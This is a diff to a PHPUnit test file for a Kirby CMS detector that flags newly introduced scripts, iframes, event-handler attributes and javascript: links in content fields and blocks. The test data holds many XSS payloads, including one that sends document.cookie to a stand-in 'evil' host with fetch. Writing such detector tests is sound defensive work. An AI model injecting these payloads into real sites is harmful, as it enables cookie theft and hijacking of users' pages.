@@ -23,7 +23,7 @@ final class ActiveContentTest extends ApiRouteTestCase
     #[DataProvider('newMarkup')]
     public function finds_new_active_markup(mixed $value, mixed $current = null): void
     {
-        $this->assertNotNull(ActiveContent::introducedIn($value, $current));
+        $this->assertNotNull(ActiveContent::refusal($value, $current));
     }
 
     public static function newMarkup(): iterable
@@ -31,11 +31,14 @@ final class ActiveContentTest extends ApiRouteTestCase
         yield 'script' => ['Hi <script>alert(1)</script>'];
         yield 'iframe' => ['<iframe src="https://evil.example"></iframe>'];
         yield 'event attribute' => ['<img src="x.jpg" onerror="alert(1)">'];
-        yield 'event attribute after a slash' => ['<svg/onload=alert(1)>'];
+        yield 'event attribute after a slash' => ['<img/onerror=alert(1) src=x>'];
         yield 'event attribute after a quote' => ['<img src="x"onerror=alert(1)>'];
         yield 'event attribute after whitespace' => ['<img src=x onerror=alert(1)>'];
-        yield 'event attribute of an SVG' => ['<svg onload=alert(1)>'];
         yield 'event attribute of a link' => ['<a onclick="x">Click</a>'];
+        yield 'event attribute the event list lacks' => ['<video src=x onfuturehandler=alert(1)>'];
+        yield 'event attribute after a quote that closes a template attribute' => ['" autofocus onfocus="alert(1)'];
+        yield 'event attribute after a quote and an encoded `>`' => ['<p>Shoe" x=&gt; onmouseover=\'alert(1)</p>'];
+        yield 'event attribute after a comment in a template attribute' => ['" src=x y=<!-- onerror=alert(1) z=-->'];
         yield 'event attribute after a `>` in a quoted value' => ['<img alt=">" src=x onerror=alert(1)>'];
         yield 'event attribute in a double-quoted value left open' => ['<img src=x onerror="alert(1)'];
         yield 'event attribute in a single-quoted value left open' => ["<img src=x onerror='alert(1)"];
@@ -58,6 +61,30 @@ final class ActiveContentTest extends ApiRouteTestCase
         yield 'second script next to an existing one' => [
             '<script src="https://platform.twitter.com/widgets.js"></script><script>fetch("//evil?" + document.cookie)</script>',
             '<script src="https://platform.twitter.com/widgets.js"></script>'
+        ];
+        yield 'second event attribute after a quote' => [
+            '<p>Shoe" onmouseover=\'alert(1)</p><p>Boot" onmouseover=\'alert(1)</p>',
+            '<p>Shoe" onmouseover=\'alert(1)</p>'
+        ];
+        yield 'image in a block after a block with an open comment' => [[
+            ['type' => 'code', 'content' => ['code' => '<!--']],
+            ['type' => 'markdown', 'content' => ['text' => '<img src=x onerror=alert(1)>']]
+        ]];
+        yield 'Markdown link in a block after a block with a code fence' => [[
+            ['type' => 'markdown', 'content' => ['text' => '```']],
+            ['type' => 'markdown', 'content' => ['text' => '[Click](javascript:alert(1))']]
+        ]];
+        yield 'event attribute of a tag split across two blocks' => [[
+            ['type' => 'markdown', 'content' => ['text' => '<div><img src="x"']],
+            ['type' => 'text', 'content' => ['text' => 'onerror=alert(1)//']]
+        ]];
+        yield 'image in a code block turned Markdown' => [
+            [['id' => 'a', 'type' => 'markdown', 'content' => ['text' => '<img src=x onerror=alert(1)>']]],
+            [['id' => 'a', 'type' => 'code', 'content' => ['code' => '<img src=x onerror=alert(1)>']]]
+        ];
+        yield 'script moved to another field of a block' => [
+            [['type' => 'card', 'content' => ['sample' => '', 'embed' => '<script>x()</script>']]],
+            [['type' => 'card', 'content' => ['sample' => '<script>x()</script>', 'embed' => '']]]
         ];
         yield 'changed body of an existing script' => ['<script>steal()</script>', '<script>track()</script>'];
         yield 'second script URL next to an existing one' => [
@@ -89,7 +116,7 @@ final class ActiveContentTest extends ApiRouteTestCase
     #[DataProvider('harmlessChanges')]
     public function lets_harmless_changes_and_existing_markup_pass(mixed $value, mixed $current = null): void
     {
-        $this->assertNull(ActiveContent::introducedIn($value, $current));
+        $this->assertNull(ActiveContent::refusal($value, $current));
     }
 
     public static function harmlessChanges(): iterable
@@ -99,6 +126,7 @@ final class ActiveContentTest extends ApiRouteTestCase
         yield 'prose in parentheses' => ['(JavaScript: closures, promises)'];
         yield 'prose in parentheses like a KirbyTag' => ['(Tip: JavaScript: closures)'];
         yield 'inline code' => ['Never write `javascript:` links.'];
+        yield 'prose with a quote before a word starting with on' => ['It\'s "the best" one = two'];
         yield 'references to a tab and a line break' => ['<p title="a&#9;b&#10;c">Text</p>'];
         // Browsers read an unquoted value up to whitespace, so the backticks and `onerror` are part of `src`.
         yield 'event attribute after a backtick' => ['<img src=`x`onerror=alert(1)>'];
@@ -111,6 +139,12 @@ final class ActiveContentTest extends ApiRouteTestCase
             'Watch it: <iframe src="https://www.youtube.com/embed/x"></iframe> Enjoy.',
             '<iframe src="https://www.youtube.com/embed/x"></iframe>'
         ];
+        yield 'an existing event attribute after a quote' => ['New text <img src="x.jpg" onerror="a()">', '<img src="x.jpg" onerror="a()">'];
+        // Kirby gives a block sent without its id a new one.
+        yield 'an existing iframe in a block sent without its id' => [
+            [['type' => 'markdown', 'content' => ['text' => '<iframe src="https://www.youtube.com/embed/x"></iframe>']]],
+            [['id' => 'a', 'type' => 'markdown', 'content' => ['text' => '<iframe src="https://www.youtube.com/embed/x"></iframe>']]]
+        ];
         yield 'an existing script moved' => [
             "New intro\n\n<script src=\"https://platform.twitter.com/widgets.js\"></script>",
             "<script src=\"https://platform.twitter.com/widgets.js\"></script>\n\nOld intro"
@@ -122,6 +156,6 @@ final class ActiveContentTest extends ApiRouteTestCase
     {
         self::bootApp(['hooks' => ['kirbytext:after' => fn () => throw new Exception('Broken')]]);
 
-        $this->assertSame("markup that couldn't be checked", ActiveContent::introducedIn('Hello', null));
+        $this->assertSame("contains markup, which the site can't check on this server. Tell the user to edit the field in the Panel.", ActiveContent::refusal('Hello', null));
     }
 }
